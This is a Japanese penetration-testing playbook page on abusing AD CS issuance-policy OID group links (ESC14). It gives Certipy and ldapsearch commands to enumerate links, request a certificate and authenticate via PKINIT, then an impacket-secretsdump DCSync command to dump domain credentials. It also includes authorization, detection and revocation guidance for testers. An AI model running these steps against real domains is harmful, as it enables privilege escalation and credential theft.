# ESC14 — Issuance Policies 悪用（OID グループリンクチェーン）

> **スコープ**: テンプレートの Issuance Policy OID が `msDS-OIDToGroupLink` 属性で特権 AD グループにリンクされている場合に、そのテンプレートで証明書を取得してグループメンバーとして認証する。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行・OID グループリンクの書き換えに業務停止リスクは低い）
> - [x] 不可逆な設定変更を含む（OID グループリンクの書き換えを行った場合）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- テンプレートに `msPKI-Certificate-Policy`（Issuance Policy OID）が設定されている
- その Issuance Policy OID が `msDS-OIDToGroupLink` 属性で AD グループ（特に特権グループ）にリンクされている
- 低権限ユーザーがそのテンプレートへの Enrollment 権限を持つ
- テンプレートが `Client Authentication` EKU を含む

## 環境前提
- 実行環境: テスター端末
- 必要なツール: Certipy 4.x 以降（`pip install certipy-ad`）/ `ldapsearch`（OID グループリンクの手動確認用）

## 先に確認すること

**攻撃者の思考トレース:** AD CS では Issuance Policy を証明書テンプレートに付与できる。この Issuance Policy が `msDS-OIDToGroupLink` を通じて AD グループにリンクされている場合、そのポリシーを持つ証明書を取得したアカウントはリンク先グループのメンバーとして扱われる。低権限ユーザーがこのテンプレートに登録できれば、実質的に特権グループのメンバーとして証明書認証が通る。ただし実環境での確認事例は非常に限定的。

---

## 1. OID グループリンクの確認

**コマンド:**

```bash
# [Attacker] Certipy で Issuance Policy リンクを確認
certipy find -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -stdout

# [Attacker] OID コンテナを LDAP で検索（手動確認）
ldapsearch -H ldap://[DC_IP] -x -D "[USER]@[DOMAIN]" -w "[PASSWORD]" \
  -b "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(msDS-OIDToGroupLink=*)" dn msDS-OIDToGroupLink displayName
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `ESC14` が `[!] Vulnerabilities` に表示 | §2 証明書申請へ直接進む |
| `msDS-OIDToGroupLink` が非特権グループを指す | ESC14 の影響は低い。リンク先グループの権限を BloodHound で別途確認 |
| OID グループリンクが存在しない | ESC14 は使えない。他の ESC を確認する |

---

## 2. 対象テンプレートで証明書を申請する

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド:**

```bash
# [Attacker] Issuance Policy OID 付きテンプレートで証明書を申請
certipy req -ca [CA_NAME] -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP]
# → 申請者（[USER]）名で証明書が発行される。証明書内に Issuance Policy OID が埋め込まれる
```

---

## 3. 証明書で PKINIT 認証 → 特権操作

**コマンド:**

```bash
# [Attacker] PKINIT 認証（OID リンクグループのメンバーとして振る舞う）
certipy auth -pfx [USER].pfx -dc-ip [DC_IP]
# → TGT には OID リンク先グループのメンバーシップが付与されている（環境依存）

# [Attacker] 取得した TGT で DCSync や横展開を試みる
export KRB5CCNAME=[USER].ccache
impacket-secretsdump -k -no-pass -target-ip [DC_IP] [DOMAIN]/[USER]@[DC_FQDN]

# [Attacker] 原状回復: 証明書の失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -revoke [REQUEST_ID]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 特権操作が成功 | ESC14 悪用成功 | `../Credential_Dumping.md`（取得情報の管理）|
| 特権操作が失敗する | OID グループリンクが認証セッションに反映されない環境 | KDC の設定・AD CS バージョンに依存する |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `certipy auth` で TGT は取得できたが特権操作が失敗する | OID グループリンクが認証セッションに反映されない環境の可能性 |
| `msDS-OIDToGroupLink` が見つからない | ESC14 の条件が存在しない。他の ESC を確認する |
| Certipy で ESC14 として検出されない | バージョンが古い可能性。最新版にアップデートするか手動で LDAP 確認する |

---

## 注意点・落とし穴

- **OID グループリンクは通常は存在しない**: `msDS-OIDToGroupLink` は意図して設定されていない限り存在しない。他の ESC を先に確認した上で ESC14 に至る
- **KDC の挙動はバージョン依存**: OID グループリンクが TGT のメンバーシップに反映されるかどうかは KDC のバージョンと設定に依存する
- **Certipy 4.x のみサポート**: 古いバージョンでは ESC14 として表示されない

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。OID グループリンク経由での特権グループへの昇格を伴う
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI アラート
- **業務影響リスク**: 証明書発行自体は業務影響なし
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した TGT・ccache の暗号化保管・テスト完了時破棄 / ✅ OID グループリンクを改ざんした場合は元に戻す
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC5（PKI オブジェクトへの Write ACL 悪用。OID オブジェクトへの Write 権限がある場合）→ `ESC5.md`
- 後：証明書取得後の横展開 → `../Kerberos_Attacks/Pass_The_Ticket.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
